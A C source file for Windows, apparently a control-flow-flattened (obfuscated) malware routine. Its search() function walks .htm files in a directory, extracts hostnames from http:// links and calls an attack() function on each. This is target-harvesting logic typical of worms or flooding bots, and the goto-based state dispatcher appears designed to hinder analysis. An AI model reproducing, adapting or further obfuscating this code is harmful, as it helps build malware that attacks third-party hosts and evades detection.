#pragma optimize("", off)

#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

void search(LPCSTR path) {
    WIN32_FIND_DATAA wfd;
    HANDLE hFind, hFile;
    DWORD bytesread;
    char *buf, *p, *host;
    DWORD size;
    volatile int ctrl_state = 1;

ctrl_dispatcher:
    if (ctrl_state == 0) goto ctrl_end;
    if (ctrl_state == 1) goto ctrl_block1;
    if (ctrl_state == 2) goto ctrl_block2;
    if (ctrl_state == 3) goto ctrl_block3;
    if (ctrl_state == 4) goto ctrl_block4;
    if (ctrl_state == 5) goto ctrl_block5;
    if (ctrl_state == 6) goto ctrl_block6;
    if (ctrl_state == 7) goto ctrl_block7;
    if (ctrl_state == 8) goto ctrl_block8;

ctrl_block1:
    // Initial SetCurrentDirectoryA
    if (!SetCurrentDirectoryA(path)) {
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 2;
    goto ctrl_dispatcher;

ctrl_block2:
    // FindFirstFileA
    hFind = FindFirstFileA("*.htm*", &wfd);
    if (hFind == INVALID_HANDLE_VALUE) {
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    ctrl_state = 3;
    goto ctrl_dispatcher;

ctrl_block3:
    // Process a single file (start of do-while body)
    hFile = CreateFileA(wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // skip to next file
        ctrl_state = 7;
        goto ctrl_dispatcher;
    }
    ctrl_state = 4;
    goto ctrl_dispatcher;

ctrl_block4:
    size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        ctrl_state = 7;
        goto ctrl_dispatcher;
    }
    ctrl_state = 5;
    goto ctrl_dispatcher;

ctrl_block5:
    buf = (char *)malloc(size + 1);
    if (!buf) {
        CloseHandle(hFile);
        ctrl_state = 7;
        goto ctrl_dispatcher;
    }
    ctrl_state = 6;
    goto ctrl_dispatcher;

ctrl_block6:
    if (!ReadFile(hFile, buf, size, &bytesread, NULL) || bytesread != size) {
        free(buf);
        CloseHandle(hFile);
        ctrl_state = 7;
        goto ctrl_dispatcher;
    }
    CloseHandle(hFile);
    buf[size] = '\0';
    p = buf;
    ctrl_state = 8;
    goto ctrl_dispatcher;

ctrl_block8:
    // Inner while loop: check *p
    if (*p == '\0') {
        // done with this file
        free(buf);
        ctrl_state = 7;
        goto ctrl_dispatcher;
    }
    // else find "http://"
    {
        char *http = strstr(p, "http://");
        if (http == NULL) {
            // no more matches, done
            free(buf);
            ctrl_state = 7;
            goto ctrl_dispatcher;
        }
        host = http + 7;
        p = strchr(host, '/');
        if (p == NULL) {
            // malformed, break
            free(buf);
            ctrl_state = 7;
            goto ctrl_dispatcher;
        }
        *p = '\0';
        attack(host);
        p++;  // move past slash
        // continue inner loop
        ctrl_state = 8;
        goto ctrl_dispatcher;
    }

ctrl_block7:
    // After processing a file, check next file (FindNextFileA)
    if (!FindNextFileA(hFind, &wfd)) {
        // no more files
        FindClose(hFind);
        ctrl_state = 0;
        goto ctrl_dispatcher;
    }
    // else go process next file
    ctrl_state = 3;
    goto ctrl_dispatcher;

ctrl_end:
    return;
}

#pragma optimize("", on)
